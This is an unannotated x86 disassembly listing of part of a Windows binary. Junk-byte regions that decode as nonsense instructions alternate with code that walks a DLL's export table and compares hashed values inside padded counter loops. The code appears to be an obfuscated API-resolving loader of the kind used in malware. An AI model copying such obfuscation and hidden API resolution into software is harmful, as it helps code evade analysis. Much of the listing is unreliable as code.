  4072b9:	repnz add bl,BYTE PTR [edx-0x2]
  4072bd:	pop    esp
  4072be:	sbb    DWORD PTR [ebx],esp
  4072c0:	aam    0xcd
  4072c2:	or     eax,0x9266dc8f
  4072c7:	inc    edx
  4072c8:	add    ch,dh
  4072ca:	inc    eax
  4072cb:	dec    ebx
  4072cc:	dec    esi
  4072cd:	cs jne 0x40734a
  4072d0:	mov    edx,0xf020bab9
  4072d5:	not    BYTE PTR [edx]
  4072d7:	sub    DWORD PTR [ebx+0x43],0x2d3a6e0a
  4072de:	imul   ebp,DWORD PTR [ebp-0xf],0xac78ed29
  4072e5:	pusha  
  4072e6:	mov    eax,0xbdab1259
  4072eb:	jmp    0xd0ba:0xe4ad8723
  4072f2:	imul   ecx,DWORD PTR [esi+eax*2+0x7c],0xffffffaa
  4072f7:	jne    0x407317
  4072f9:	mov    ds:0xd6e462ee,eax
  4072fe:	in     eax,0x8d
  407300:	push   ss
  407301:	sti    
  407302:	jg     0x40734f
  407304:	fsubp  st(7),st
  407306:	aad    0x8c
  407308:	pop    ebp
  407309:	call   0xc99ee6da
  40730e:	test   DWORD PTR [ecx],edx
  407310:	mov    esp,0x4d89c320
  407315:	in     al,0x21
  407317:	sbb    eax,0x4292a5
  40731c:	imul   edx,eax
  40731f:	neg    esi
  407321:	mov    ecx,0x4573
  407326:	add    edx,ecx
  407328:	mov    esi,0x7879
  40732d:	and    DWORD PTR ds:0x42c88e,0x0
  407337:	xor    edi,edi
  407339:	add    edi,DWORD PTR ds:0x42c88e
  40733f:	inc    edi
  407340:	mov    DWORD PTR ds:0x42c88e,edi
  407346:	cmp    DWORD PTR ds:0x42c88e,0x26
  40734d:	jne    0x407368
  407353:	push   0x70d3
  407358:	push   0x0
  40735a:	push   DWORD PTR [ebp-0x10]
  40735d:	push   0x5a5a
  407362:	call   DWORD PTR ds:0x427acf
  407368:	cmp    DWORD PTR ds:0x42c88e,0x19
  40736f:	jb     0x407337
  407375:	and    DWORD PTR ds:0x42c89e,0x0
  40737f:	mov    edi,DWORD PTR ds:0x42c89e
  407385:	inc    edi
  407386:	mov    DWORD PTR ds:0x42c89e,edi
  40738c:	cmp    DWORD PTR ds:0x42c89e,0xb
  407393:	jne    0x4073a5
  407399:	push   DWORD PTR [ebp-0x24]
  40739c:	push   DWORD PTR [ebp-0x14]
  40739f:	call   DWORD PTR ds:0x4279f7
  4073a5:	cmp    DWORD PTR ds:0x42c89e,0xa
  4073ac:	jne    0x4073bf
  4073b2:	mov    edi,DWORD PTR ds:0x42c89e
  4073b8:	inc    edi
  4073b9:	mov    DWORD PTR ds:0x42c89e,edi
  4073bf:	cmp    DWORD PTR ds:0x42c89e,0x1a
  4073c6:	jb     0x40737f
  4073cc:	xor    DWORD PTR ds:0x427d17,edx
  4073d2:	mov    edi,0x1556
  4073d7:	xchg   esi,ecx
  4073d9:	sub    edx,edi
  4073db:	sbb    ecx,DWORD PTR ds:0x4292d1
  4073e1:	xor    esi,esi
  4073e3:	mov    DWORD PTR [ebp-0x28],esi
  4073e6:	or     ecx,DWORD PTR ds:0x427d1f
  4073ec:	mov    DWORD PTR [ebp-0x2c],esi
  4073ef:	mov    ecx,DWORD PTR ds:0x42c886
  4073f5:	xor    DWORD PTR ds:0x42759c,ecx
  4073fb:	mov    DWORD PTR [ebp-0x14],esi
  4073fe:	and    DWORD PTR ds:0x4292c1,0x0
  407408:	jmp    0x40741c
  40740d:	xor    ecx,ecx
  40740f:	or     ecx,DWORD PTR ds:0x4292c1
  407415:	inc    ecx
  407416:	mov    DWORD PTR ds:0x4292c1,ecx
  40741c:	cmp    DWORD PTR ds:0x4292c1,0x12
  407423:	jae    0x4075d0
  407429:	cmp    DWORD PTR ds:0x4292c1,0x1e
  407430:	jne    0x40743c
  407436:	call   DWORD PTR ds:0x427ad3
  40743c:	jmp    0x40740d
  407441:	sub    ecx,0x7ae1
  407447:	jmp    0x4075d0
  40744c:	add    DWORD PTR [eax-0xd],edx
  40744f:	sbb    esp,DWORD PTR [ebp-0x5]
  407452:	cdq    
  407453:	push   0xffffffc7
  407455:	stos   BYTE PTR es:[edi],al
  407456:	cmp    eax,eax
  407458:	xchg   dl,cl
  40745a:	into   
  40745b:	add    al,BYTE PTR [ebx-0x178383e0]
  407461:	jg     0x4074df
  407463:	jl     0x40740b
  407465:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407466:	fbstp  TBYTE PTR [eax+0x8cad8a0]
  40746c:	pusha  
  40746d:	inc    esp
  40746e:	or     edi,edi
  407470:	fstp   QWORD PTR fs:[ecx-0x3b]
  407474:	xor    ebx,DWORD PTR [eax*2-0x5db75fce]
  40747b:	loope  0x407428
  40747d:	dec    edi
  40747e:	ficom  DWORD PTR [edi+0x2e]
  407481:	mov    al,ds:0x491b69a6
  407486:	inc    ecx
  407487:	ss out 0x83,al
  40748a:	mov    edx,0xc363de38
  40748f:	inc    ebx
  407490:	inc    edx
  407491:	push   cs
  407492:	cmovp  ecx,DWORD PTR [edx]
  407495:	fsub   QWORD PTR [ebx]
  407497:	ds jge 0x40742b
  40749a:	pop    ss
  40749b:	and    cl,cl
  40749d:	adc    al,0x9c
  40749f:	mov    esp,0xf5f493a4
  4074a4:	cmp    DWORD PTR [ebp-0x13],0x8c9ed6cd
  4074ab:	daa    
  4074ac:	in     al,dx
  4074ad:	loope  0x407436
  4074af:	rep lods eax,DWORD PTR ds:[esi]
  4074b1:	fcom   DWORD PTR gs:[eax+edi*2+0x6045a777]
  4074b9:	ds es repz and al,0xa0
  4074be:	test   BYTE PTR [edx-0x1d],0x84
  4074c2:	sbb    BYTE PTR [eax+0x6d],bl
  4074c5:	dec    ebp
  4074c6:	mov    ch,0x46
  4074c8:	(bad)  
  4074c9:	cdq    
  4074ca:	sbb    eax,0xeb3ec2d4
  4074cf:	int    0x22
  4074d1:	ds jmp 0x5c8c24dc
  4074d7:	push   eax
  4074d8:	cmp    edx,DWORD PTR [esi-0x55]
  4074db:	and    ch,ah
  4074dd:	mov    es,WORD PTR [eax+0x5296a10f]
  4074e3:	add    dh,ah
  4074e5:	or     DWORD PTR [ebx+0x76c6ebb8],edx
  4074eb:	out    0x7a,eax
  4074ed:	fnsave [ecx+ecx*2+0x39]
  4074f1:	mov    BYTE PTR [edx+0x6c016481],ah
  4074f7:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4074f9:	fsub   DWORD PTR [ecx-0x364caec9]
  4074ff:	add    edx,edx
  407501:	mov    edx,0x827ac7ae
  407506:	idiv   BYTE PTR [edx-0x3124635c]
  40750c:	sub    DWORD PTR [ebp+0x46b1a3f6],edx
  407512:	mov    esi,0xedf46e8b
  407517:	inc    edi
  407518:	dec    esi
  407519:	fsub   QWORD PTR [edx+0x59a00ae4]
  40751f:	retf   
  407520:	mov    edx,0xf603459e
  407525:	adc    BYTE PTR [ebp+0x1],dh
  407528:	sar    DWORD PTR [eax+0x682e7d25],cl
  40752e:	test   BYTE PTR [eax],dl
  407530:	jne    0x407564
  407532:	es aas 
  407534:	sub    ecx,esp
  407536:	cmp    ebx,DWORD PTR [ebx-0x78]
  407539:	xor    cl,BYTE PTR [ebx-0x57cb1edb]
  40753f:	mov    ebx,0x8903563d
  407544:	clc    
  407545:	mov    esp,0xf816cbce
  40754a:	jecxz  0x407501
  40754c:	add    al,0x7b
  40754e:	daa    
  40754f:	add    BYTE PTR [ebx+0x33],ch
  407552:	mov    edx,0x23426f7d
  407557:	in     eax,dx
  407558:	leave  
  407559:	loopne 0x4075bb
  40755b:	jmp    0x42ea5148
  407560:	add    DWORD PTR [ecx+edi*4-0x69],esi
  407564:	dec    ecx
  407565:	ja     0x4075a1
  407567:	inc    edx
  407568:	mov    dh,0x8b
  40756a:	mov    DWORD PTR [esi],ebx
  40756c:	ror    esi,1
  40756e:	lea    esi,[ebx-0x22]
  407571:	xchg   esi,eax
  407572:	push   es
  407573:	mov    WORD PTR [eax+0x7f],?
  407576:	dec    esp
  407577:	mov    ebx,0x6eb210
  40757c:	inc    esi
  40757d:	mov    cl,0xe8
  40757f:	aad    0x7
  407581:	jb     0x40756a
  407583:	jge    0x4075c5
  407585:	jp     0x407558
  407587:	cmp    DWORD PTR [ebp+0x11f3fd4d],ebp
  40758d:	mov    al,ds:0x61369b5d
  407592:	retf   0xd1bd
  407595:	fstp   QWORD PTR [esi+0xf]
  407598:	mov    bl,0xb2
  40759a:	jne    0x407616
  40759c:	adc    DWORD PTR [esi],ecx
  40759e:	out    dx,al
  40759f:	mov    ebx,DWORD PTR [ebx]
  4075a1:	imul   esi,DWORD PTR [edi],0x5118cfd9
  4075a7:	sbb    dl,BYTE PTR [eax-0x4a22c301]
  4075ad:	arpl   bp,si
  4075af:	pushf  
  4075b0:	fwait
  4075b1:	cmp    bl,ah
  4075b3:	cmp    eax,0x5b20f1b1
  4075b8:	add    BYTE PTR [ebp-0x3ee91bd1],ah
  4075be:	inc    esp
  4075bf:	ror    DWORD PTR [esi+ebx*2-0x23],0xa6
  4075c4:	(bad)  [ecx+ebp*8-0x54]
  4075c8:	pop    ebx
  4075c9:	pushf  
  4075ca:	pop    ss
  4075cb:	stc    
  4075cc:	and    dh,BYTE PTR [edx+esi*1-0x78a767e]
  4075d3:	mov    ecx,DWORD PTR [ebp-0x18]
  4075d6:	xor    ecx,eax
  4075d8:	movzx  eax,BYTE PTR ds:0x4292bd
  4075df:	add    eax,DWORD PTR ds:0x4275b0
  4075e5:	mov    ds:0x4292bd,eax
  4075ea:	xor    edi,edi
  4075ec:	and    eax,DWORD PTR ds:0x427594
  4075f2:	jmp    0x40777b
  4075f7:	dec    cl
  4075f9:	pushf  
  4075fa:	adc    dl,BYTE PTR [edi+0x6d]
  4075fd:	repnz ins DWORD PTR es:[edi],dx
  4075ff:	xchg   esi,eax
  407600:	dec    eax
  407601:	fstp   DWORD PTR [ebp+0x46]
  407604:	inc    edx
  407605:	jns    0x407607
  407607:	jg     0x40762b
  407609:	jl     0x407687
  40760b:	call   0x76bcf28f
  407610:	mov    dl,0x8d
  407612:	or     eax,0x98cf461
  407617:	hlt    
  407618:	daa    
  407619:	outs   dx,DWORD PTR ds:[esi]
  40761a:	add    DWORD PTR [eax],ecx
  40761c:	inc    eax
  40761d:	out    0x69,eax
  40761f:	cmp    al,0x83
  407621:	not    DWORD PTR [esp+edi*2]
  407624:	mov    cl,0x93
  407626:	nop
  407627:	push   ds
  407628:	call   0x26f3:0x6b93f16f
  40762f:	push   es
  407630:	mov    eax,0x17393a58
  407635:	xchg   DWORD PTR [edi-0xd31fcbf],esp
  40763b:	inc    esp
  40763c:	inc    esi
  40763d:	push   es
  40763e:	imul   ebp,DWORD PTR [eax],0x42a6da50
  407644:	mov    ah,0xca
  407646:	stc    
  407647:	arpl   WORD PTR [ebx],di
  407649:	sbb    ah,BYTE PTR [eax-0x1e]
  40764c:	xchg   edi,eax
  40764d:	or     eax,0x25897d24
  407652:	cmp    al,0xa8
  407654:	or     al,0xdb
  407656:	outs   dx,DWORD PTR ds:[esi]
  407657:	push   ebx
  407658:	test   DWORD PTR [edx],ecx
  40765a:	xlat   BYTE PTR ds:[ebx]
  40765b:	popa   
  40765c:	dec    ebx
  40765d:	push   esi
  40765e:	sub    esi,ecx
  407660:	ja     0x40766d
  407662:	sbb    al,0xdb
  407664:	mov    ds:0x12d407c0,eax
  407669:	fmul   QWORD PTR [eax+0x59]
  40766c:	ficomp WORD PTR [ecx+0x2f0f9ff3]
  407672:	ror    DWORD PTR [ebp+ebp*2+0x15e3da9d],0x12
  40767a:	aam    0xa9
  40767c:	dec    edx
  40767d:	mov    eax,0x8025ba98
  407682:	rol    edx,1
  407684:	and    al,0xae
  407686:	ret    0x107f
  407689:	in     eax,0x80
  40768b:	test   al,0x5c
  40768d:	cmc    
  40768e:	fsub   QWORD PTR [ecx]
  407690:	outs   dx,BYTE PTR ds:[esi]
  407691:	test   DWORD PTR [esi+ebx*1+0x52070a03],esp
  407698:	lea    eax,[edx+0x47a3f244]
  40769e:	add    dh,0x83
  4076a1:	or     BYTE PTR [ecx],cl
  4076a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076a4:	(bad)  
  4076a5:	jge    0x4076bf
  4076a7:	xor    al,0xc5
  4076a9:	xchg   ecx,eax
  4076aa:	cmp    dl,bl
  4076ac:	mov    ds:0x30073fa1,al
  4076b1:	pop    ds
  4076b2:	sbb    eax,0xb3e4298b
  4076b7:	retf   
  4076b8:	shl    al,0xfb
  4076bb:	ret    0xbadd
  4076be:	cmp    al,0x58
  4076c0:	pop    ss
  4076c1:	inc    ebx
  4076c2:	lock sbb al,0x91
  4076c5:	ret    0x9572
  4076c8:	nop
  4076c9:	aaa    
  4076ca:	mov    dl,0x31
  4076cc:	sbb    BYTE PTR [ebp-0x16],0xd9
  4076d0:	pavgw  mm4,QWORD PTR [edi]
  4076d3:	clc    
  4076d4:	mov    cl,BYTE PTR [eax+0x13]
  4076d7:	xor    eax,0x28f99ea8
  4076dc:	dec    ebp
  4076dd:	retf   
  4076de:	ret    
  4076df:	ret    0x89be
  4076e2:	clc    
  4076e3:	mov    ch,0x25
  4076e5:	jmp    0x1f56:0xac776a1f
  4076ec:	pop    edx
  4076ed:	dec    esp
  4076ee:	push   cs
  4076ef:	call   0x53c4:0x82feb956
  4076f6:	repnz test BYTE PTR [esi],al
  4076f9:	retf   
  4076fa:	dec    esp
  4076fb:	out    0xe,al
  4076fd:	ret    
  4076fe:	jne    0x407688
  407700:	xchg   esp,eax
  407701:	pop    esi
  407702:	add    ebx,esp
  407704:	fisub  WORD PTR [esi+0x35768e5e]
  40770a:	es je  0x407739
  40770d:	and    BYTE PTR [edi-0x1bd5de41],al
  407713:	xor    DWORD PTR [ebx],ecx
  407715:	mov    esi,0xbbcbcd2d
  40771a:	and    eax,0x9c3a9b39
  40771f:	outs   dx,DWORD PTR ds:[esi]
  407720:	mov    dh,0x59
  407722:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407723:	outs   dx,BYTE PTR cs:[esi]
  407725:	adc    BYTE PTR [edx+edx*4],ah
  407728:	fst    DWORD PTR [edx+0x3d]
  40772b:	and    bh,BYTE PTR [esi]
  40772d:	sbb    eax,0x310a2907
  407732:	pushf  
  407733:	add    al,0xb0
  407735:	in     al,0x95
  407737:	xor    edi,eax
  407739:	(bad)  
  40773a:	adc    eax,0x199e3d8c
  40773f:	push   0xce3d9951
  407744:	mov    bl,0x2a
  407746:	into   
  407747:	sub    al,0xd2
  407749:	and    DWORD PTR [ebp-0x77adf7b3],ecx
  40774f:	out    0xfb,eax
  407751:	pop    ecx
  407752:	xchg   edi,eax
  407753:	(bad)  
  407754:	xor    esp,edi
  407756:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407757:	hlt    
  407758:	push   edi
  407759:	ds pop esi
  40775b:	aas    
  40775c:	(bad)  
  40775d:	scas   al,BYTE PTR es:[edi]
  40775e:	xor    eax,0x3ff652eb
  407763:	pop    ds
  407764:	ins    DWORD PTR es:[edi],dx
  407765:	repz loop 0x4076fe
  407768:	gs dec edx
  40776a:	mov    cl,0x22
  40776c:	leave  
  40776d:	push   ds
  40776e:	mov    ds:0xec771624,eax
  407773:	jo     0x40779d
  407775:	rcl    BYTE PTR [eax-0x15d7643e],1
  40777b:	add    ecx,ebx
  40777d:	mov    DWORD PTR [ebp-0x20],ecx
  407780:	mov    eax,DWORD PTR [ebp-0x20]
  407783:	je     0x407a73
  407789:	and    DWORD PTR ds:0x42c882,0x0
  407793:	xor    eax,eax
  407795:	xor    eax,DWORD PTR ds:0x42c882
  40779b:	inc    eax
  40779c:	mov    ds:0x42c882,eax
  4077a1:	cmp    DWORD PTR ds:0x42c882,0x16
  4077a8:	jne    0x4077b9
  4077ae:	push   0x42785c
  4077b3:	call   DWORD PTR ds:0x427c77
  4077b9:	cmp    DWORD PTR ds:0x42c882,0x11
  4077c0:	jb     0x407793
  4077c6:	mov    eax,ds:0x42c88e
  4077cb:	xor    DWORD PTR ds:0x4292dd,eax
  4077d1:	mov    eax,DWORD PTR [ebp-0x4]
  4077d4:	xor    eax,0x7510857
  4077d9:	xor    DWORD PTR ds:0x4292c9,0x4292c1
  4077e3:	add    eax,ebx
  4077e5:	cmp    edi,eax
  4077e7:	jne    0x40788d
  4077ed:	sub    DWORD PTR ds:0x42759c,0x4275a4
  4077f7:	push   DWORD PTR [ebp+0x8]
  4077fa:	call   0x4063f7
  4077ff:	mov    DWORD PTR [ebp-0x20],eax
  407802:	xor    eax,eax
  407804:	add    eax,DWORD PTR ds:0x4292f5
  40780a:	xor    esi,esi
  40780c:	xor    esi,DWORD PTR ds:0x4278af
  407812:	sub    esi,eax
  407814:	sub    eax,DWORD PTR [eax+esi*1]
  407817:	mov    eax,DWORD PTR [ebp-0x4]
  40781a:	sub    esi,DWORD PTR ds:0x42c896
  407820:	mov    ecx,DWORD PTR [ebp-0x20]
  407823:	mov    esi,0x7510857
  407828:	xor    eax,esi
  40782a:	adc    DWORD PTR ds:0x4292b9,0x7173
  407834:	add    eax,ebx
  407836:	cmp    ecx,eax
  407838:	je     0x407a57
  40783e:	push   DWORD PTR [ebp-0x20]
  407841:	push   DWORD PTR [ebp+0x8]
  407844:	call   0x4064f3
  407849:	mov    DWORD PTR [ebp-0x14],eax
  40784c:	mov    eax,DWORD PTR [ebp-0x4]
  40784f:	mov    ecx,DWORD PTR [ebp-0x14]
  407852:	xor    eax,esi
  407854:	add    eax,ebx
  407856:	cmp    ecx,eax
  407858:	je     0x407a57
  40785e:	mov    eax,DWORD PTR [ebp-0x14]
  407861:	mov    eax,DWORD PTR [eax+0x18]
  407864:	mov    DWORD PTR [ebp-0x20],eax
  407867:	mov    eax,DWORD PTR [ebp-0x14]
  40786a:	mov    ecx,DWORD PTR [ebp+0x8]
  40786d:	add    ecx,DWORD PTR [eax+0x20]
  407870:	mov    DWORD PTR [ebp-0x28],ecx
  407873:	mov    eax,DWORD PTR [ebp-0x14]
  407876:	mov    ecx,DWORD PTR [ebp+0x8]
  407879:	add    ecx,DWORD PTR [eax+0x24]
  40787c:	mov    DWORD PTR [ebp-0x2c],ecx
  40787f:	mov    eax,DWORD PTR [ebp-0x14]
  407882:	mov    ecx,DWORD PTR [ebp+0x8]
  407885:	add    ecx,DWORD PTR [eax+0x1c]
  407888:	xor    esi,esi
  40788a:	mov    DWORD PTR [ebp-0x14],ecx
  40788d:	mov    eax,DWORD PTR [ebp-0x28]
  407890:	mov    ecx,DWORD PTR [ebp+0x8]
  407893:	add    ecx,DWORD PTR [eax+edi*4]
  407896:	lea    eax,[ebp-0x8]
  407899:	mov    DWORD PTR [ebp-0x30],ecx
  40789c:	push   eax
  40789d:	push   DWORD PTR [ebp-0x30]
  4078a0:	push   DWORD PTR [ebp+0xc]
  4078a3:	call   0x403932
  4078a8:	mov    eax,DWORD PTR [ebp-0x4]
  4078ab:	mov    ecx,DWORD PTR [ebp-0x8]
  4078ae:	xor    eax,0x7510857
  4078b3:	add    eax,ebx
  4078b5:	jmp    0x407a3e
  4078ba:	retf   
  4078bb:	idiv   BYTE PTR [edi+0x6de9b5d6]
  4078c1:	lods   eax,DWORD PTR ds:[esi]
  4078c2:	out    0xb6,al
  4078c4:	scas   eax,DWORD PTR es:[edi]
  4078c5:	xchg   DWORD PTR [ebp-0x52],edx
  4078c8:	(bad)  
  4078c9:	bnd jmp 0x4078f1
  4078cc:	jl     0x40794a
  4078ce:	call   0x44bcf552
  4078d3:	or     eax,0xa490555f
  4078d8:	pop    ds
  4078d9:	xchg   BYTE PTR [esi],ch
  4078db:	femms  
  4078dd:	rcl    BYTE PTR [edx],cl
  4078df:	je     0x407888
  4078e1:	imul   ebx,DWORD PTR [ebx+0x7a],0x53d02769
  4078e8:	mov    al,ds:0x9d09bc45
  4078ed:	push   edi
  4078ee:	xchg   edi,eax
  4078ef:	imul   ecx,DWORD PTR [ebp+0x1c],0xffffffac
  4078f3:	hlt    
  4078f4:	pop    eax
  4078f5:	mov    DWORD PTR [ebp+0x70],edi
  4078f8:	mov    gs,WORD PTR [ebp-0x2c]
  4078fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078fc:	int3   
  4078fd:	popa   
  4078fe:	out    0xf8,al
  407900:	popf   
  407901:	pop    edx
  407902:	xchg   ebp,eax
  407903:	sti    
  407904:	inc    esp
  407905:	test   al,0x41
  407907:	adc    ch,al
  407909:	sbb    dh,al
  40790b:	jle    0x4078c8
  40790d:	sub    al,dh
  40790f:	ins    DWORD PTR es:[edi],dx
  407910:	pop    ecx
  407911:	mov    cl,0x53
  407913:	daa    
  407914:	repnz cmp cl,BYTE PTR [esi-0x61]
  407918:	or     esp,DWORD PTR [ecx+0x3d]
  40791b:	sub    dl,BYTE PTR [edx]
  40791d:	iret   
  40791e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40791f:	(bad)  
  407920:	mov    esp,0xd0eaaa4
  407925:	mov    ah,0x71
  407927:	xchg   ebp,eax
  407928:	pop    ebx
  407929:	frstor ds:0x98ef9b42
  40792f:	call   0x9fd1:0xc3956774
  407936:	cmp    ebx,esp
  407938:	stos   BYTE PTR es:[edi],al
  407939:	cdq    
  40793a:	sub    cl,BYTE PTR [ecx]
  40793c:	or     al,0x6a
  40793e:	add    DWORD PTR [edx+edx*2-0x77],ebp
  407942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407943:	add    ebp,DWORD PTR [esi+ecx*8]
  407946:	sar    DWORD PTR [ecx],0xb5
  407949:	push   0x45
  40794b:	sahf   
  40794c:	aas    
  40794d:	jp     0x407927
  40794f:	fcmovbe st,st(4)
  407951:	outs   dx,DWORD PTR ds:[esi]
  407952:	push   edx
  407953:	xchg   ebp,eax
  407954:	int    0xd8
  407956:	nop
  407957:	sbb    cl,al
  407959:	ret    
  40795a:	xor    al,0x30
  40795c:	cmp    eax,DWORD PTR [edx-0x39abfa7f]
  407962:	ss aam 0x5e
  407965:	sbb    dh,BYTE PTR [eax+0x2562aa33]
  40796b:	adc    dl,dl
  40796d:	mov    DWORD PTR [eax+0x2e0a2582],ebx
  407973:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407974:	mov    DWORD PTR gs:[edi+0x8ccbe82],ebx
  40797b:	jne    0x407926
  40797d:	aaa    
  40797e:	mov    dh,0x2a
  407980:	cdq    
  407981:	xor    al,0xd9
  407983:	jns    0x407936
  407985:	sub    BYTE PTR [ebx+0x19ec7bc3],al
  40798b:	sbb    al,0x3f
  40798d:	or     ch,BYTE PTR [ecx+0x4e7dc7ca]
  407993:	outs   dx,BYTE PTR ds:[esi]
  407994:	push   ds
  407995:	out    0x6a,al
  407997:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407998:	jbe    0x40798d
  40799a:	fiadd  DWORD PTR [edi-0x1b39c866]
  4079a0:	(bad)  
  4079a2:	mov    ch,0x3b
  4079a4:	mov    eax,0xac3dc93e
  4079a9:	and    eax,0x7196359e
  4079ae:	or     al,0x79
  4079b0:	ret    0x8784
  4079b3:	bound  esp,QWORD PTR [edi+0x5e]
  4079b6:	or     edx,DWORD PTR [edx+0x5ed788ca]
  4079bc:	push   cs
  4079bd:	iret   
  4079be:	test   DWORD PTR [edx+0x6f00ad9d],edx
  4079c4:	inc    esi
  4079c5:	in     eax,dx
  4079c6:	fisub  DWORD PTR [ebx+0x48]
  4079c9:	jp     0x4079c3
  4079cb:	pop    ss
  4079cc:	or     bl,ah
  4079ce:	in     al,dx
  4079cf:	jg     0x4079a5
  4079d1:	fwait
  4079d2:	xor    DWORD PTR [ebp+0x47b3fcd2],ebp
  4079d8:	shr    DWORD PTR [ebx+edx*1+0x31fcd22a],0x7c
  4079e0:	test   BYTE PTR [edi],bh
  4079e2:	ret    
  4079e3:	arpl   bp,cx
  4079e5:	mov    ah,0xac
  4079e7:	inc    edx
  4079e8:	sub    ah,BYTE PTR [ecx-0x5f119d22]
  4079ee:	jo     0x40798d
  4079f0:	iret   
  4079f1:	push   0xffffffa1
  4079f3:	sar    bh,0xa3
  4079f6:	lods   al,BYTE PTR ds:[esi]
  4079f7:	out    dx,eax
  4079f8:	add    eax,0xf7a688c
  4079fd:	mov    ch,0x9b
  4079ff:	jne    0x407a21
  407a01:	dec    ebx
  407a02:	push   edi
  407a03:	adc    ebx,DWORD PTR [ebp+0x79]
  407a06:	loope  0x4079b4
  407a08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a09:	ja     0x407990
  407a0b:	adc    BYTE PTR [ebp-0x42f02e3d],dh
  407a11:	and    BYTE PTR [ecx+edx*1+0x150434f5],ch
  407a18:	and    ecx,0x6d3a208e
  407a1e:	lods   eax,DWORD PTR ds:[esi]
  407a1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a20:	(bad)  
  407a22:	icebp  
  407a23:	(bad)
  407a26:	push   ds
  407a27:	fcomi  st,st(1)
  407a29:	jp     0x407a65
  407a2b:	or     eax,0x52ff6ba3
  407a30:	dec    esp
  407a31:	mov    al,BYTE PTR [ebx-0x4259cd0f]
  407a37:	test   eax,0xda12f7c3
  407a3c:	mov    ah,0x37
  407a3e:	cmp    ecx,eax
  407a40:	jne    0x407a63
  407a46:	mov    eax,DWORD PTR [ebp-0x20]
  407a49:	inc    edi
  407a4a:	cmp    edi,eax
  407a4c:	jb     0x407789
  407a52:	jmp    0x407a73
  407a57:	mov    eax,DWORD PTR [ebp-0x4]
  407a5a:	xor    eax,esi
  407a5c:	add    eax,ebx
  407a5e:	jmp    0x408b1b
  407a63:	mov    eax,DWORD PTR [ebp-0x2c]
  407a66:	movzx  eax,WORD PTR [eax+edi*2]
  407a6a:	mov    ecx,DWORD PTR [ebp-0x14]
  407a6d:	mov    eax,DWORD PTR [ecx+eax*4]
  407a70:	mov    DWORD PTR [ebp+0xc],eax
  407a73:	mov    eax,DWORD PTR [ebp-0x4]
  407a76:	mov    ecx,DWORD PTR [ebp-0x8]
  407a79:	xor    eax,0x7510857
  407a7e:	add    eax,ebx
  407a80:	cmp    ecx,eax
  407a82:	jne    0x407a95
  407a88:	mov    eax,DWORD PTR [ebp-0x4]
  407a8b:	xor    eax,0x7510857
  407a90:	jmp    0x407a5c
  407a95:	mov    eax,DWORD PTR [ebp+0xc]
  407a98:	add    eax,DWORD PTR [ebp+0x8]
  407a9b:	mov    DWORD PTR [ebp-0x10],eax
  407a9e:	mov    eax,DWORD PTR [ebp-0x1c]
  407aa1:	test   eax,eax
  407aa3:	je     0x4087bb
  407aa9:	mov    DWORD PTR [ebp-0x24],esi
  407aac:	push   0xb
  407aae:	pop    ecx
  407aaf:	push   0x5
  407ab1:	dec    ecx
  407ab2:	pop    ebx
  407ab3:	xchg   ebx,ecx
  407ab5:	sub    ebx,ecx
  407ab7:	xchg   ebx,ecx
  407ab9:	dec    ecx
  407aba:	jmp    0x407c43
  407abf:	adc    edi,DWORD PTR [eax+0x2d9d7285]
  407ac5:	mov    ds:0xbdc820bd,eax
  407aca:	inc    edx
  407acb:	(bad)  
  407acd:	cmp    DWORD PTR [esi+0x7c7c2447],ecx
  407ad3:	call   0xd5bcf757
  407ad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ad9:	ror    BYTE PTR [edx-0x44],0x60
  407add:	pop    es
  407ade:	push   ebx
  407adf:	mov    ecx,0x53695a81
  407ae4:	mov    eax,ds:0xde0b2f49
  407ae9:	ins    BYTE PTR es:[edi],dx
  407aea:	or     dl,BYTE PTR [edx]
  407aec:	mov    eax,0x3c1212d8
  407af1:	cld    
  407af2:	nop
  407af3:	pop    ss
  407af4:	mov    dl,BYTE PTR [eax+eiz*1]
  407af7:	out    dx,eax
  407af8:	push   fs
  407afa:	jmp    0x93f0:0xd56f77f3
  407b01:	sub    BYTE PTR [ebx+0x7b],bl
  407b04:	or     ecx,DWORD PTR [ebp+0xfddbdf0]
  407b0a:	cli    
  407b0b:	adc    DWORD PTR [esi+0x79d80230],ebx
  407b11:	mov    ?,WORD PTR [ebx-0x11]
  407b14:	push   ebp
  407b15:	cli    
  407b16:	cmc    
  407b17:	sbb    eax,0x626e0884
  407b1c:	pop    edi
  407b1d:	cmc    
  407b1e:	test   BYTE PTR [ecx-0x3e],bh
  407b21:	xor    al,0xa2
  407b23:	push   cs
  407b24:	shr    DWORD PTR [edx+0x69d69aef],1
  407b2a:	and    eax,DWORD PTR [esi-0x59f9f6b9]
  407b30:	clc    
  407b31:	xchg   esi,eax
  407b32:	push   es
  407b33:	inc    DWORD PTR [ebp-0x5]
  407b36:	mov    bh,0x9d
  407b38:	rcl    DWORD PTR [ebx+0x17],1
  407b3b:	pop    ebx
  407b3c:	in     al,0x51
  407b3e:	mov    DWORD PTR [eax-0x28],ebx
  407b41:	push   ss
  407b42:	mov    eax,ds:0xb2218066
  407b47:	ins    BYTE PTR es:[edi],dx
  407b48:	lds    edi,FWORD PTR [ebx-0xd105faa]
  407b4e:	prefetchnta BYTE PTR [eax+0x6050c13b]
  407b55:	push   0x76
  407b57:	jge    0x407b0f
  407b59:	cdq    
  407b5a:	push   0xffffffde
  407b5c:	(bad)  
  407b5d:	or     bl,BYTE PTR [eax+0x72]
  407b60:	pop    esi
  407b61:	shl    bl,1
  407b63:	nop
  407b64:	xor    esi,DWORD PTR ds:0xdb50c434
  407b6a:	mov    ?,WORD PTR [ebp+0x33]
  407b6d:	cmp    eax,0xb385385e
  407b72:	mov    al,dh
  407b74:	sti    
  407b75:	test   WORD PTR [edx+0x6],ax
  407b79:	arpl   WORD PTR [edx+edi*1-0x75],ax
  407b7d:	mov    edi,0x5f27e8b6
